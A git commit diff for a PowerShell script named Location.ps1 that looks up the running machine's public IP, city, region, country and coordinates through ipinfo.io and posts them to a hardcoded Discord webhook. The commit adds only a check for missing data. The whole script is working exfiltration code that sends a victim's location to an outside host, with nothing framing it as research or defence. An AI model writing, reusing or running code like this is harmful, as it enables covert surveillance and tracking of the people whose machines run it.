886123756664661d5c58c5252a4f7c028c2578fe
Cocotjuhh <155767892+Cocotjuhh@users.noreply.github.com>
2024-12-31 22:13:22 +0100

    Update Location.ps1

--- Win/Location.ps1
+++ Win/Location.ps1
@@ -4,15 +4,20 @@ $webhookUrl = "https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B
 # Get location data using ipinfo.io
 $locationData = Invoke-RestMethod -Uri "https://ipinfo.io/json"
 
-# Extract information
-$ip = $locationData.ip
-$city = $locationData.city
-$region = $locationData.region
-$country = $locationData.country
-$coordinates = $locationData.loc
+# Check if location data was retrieved
+if ($locationData) {
+    # Extract information
+    $ip = $locationData.ip
+    $city = $locationData.city
+    $region = $locationData.region
+    $country = $locationData.country
+    $coordinates = $locationData.loc
 
-# Format the message
-$message = "IP: $ip`nCity: $city`nRegion: $region`nCountry: $country`nCoordinates: $coordinates"
+    # Format the message
+    $message = "IP: $ip`nCity: $city`nRegion: $region`nCountry: $country`nCoordinates: $coordinates"
 
-# Send the message to Discord webhook
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1)
+    # Send the message to the Discord webhook
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1)
+} else {
+    Write-Host "Failed to retrieve location data."
+}
